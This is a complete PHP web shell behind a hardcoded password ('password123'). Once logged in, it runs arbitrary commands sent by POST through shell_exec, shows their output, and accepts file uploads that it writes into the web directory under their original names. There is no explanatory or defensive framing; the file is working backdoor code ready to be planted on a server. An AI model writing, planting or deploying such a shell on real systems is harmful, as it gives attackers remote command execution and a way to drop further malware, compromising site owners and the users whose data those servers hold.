<?php
// 
$password = "password123"; 
if (isset($_POST['pass']) && $_POST['pass'] === $password) {
    if (isset($_POST['cmd'])) {
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }
    echo '
    <form method="POST">
        <input type="text" name="cmd" placeholder="Command">
        <input type="hidden" name="pass" value="' . $password . '">
        <input type="submit" value="Execute">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="hidden" name="pass" value="' . $password . '">
        <input type="submit" name="upload" value="Upload">
    </form>
    ';
    if (isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "File uploaded: " . $_FILES['file']['name'];
    }
} else {
    echo '
    <form method="POST">
        <input type="password" name="pass" placeholder="Password">
        <input type="submit" value="Login">
    </form>
    ';
}
?>
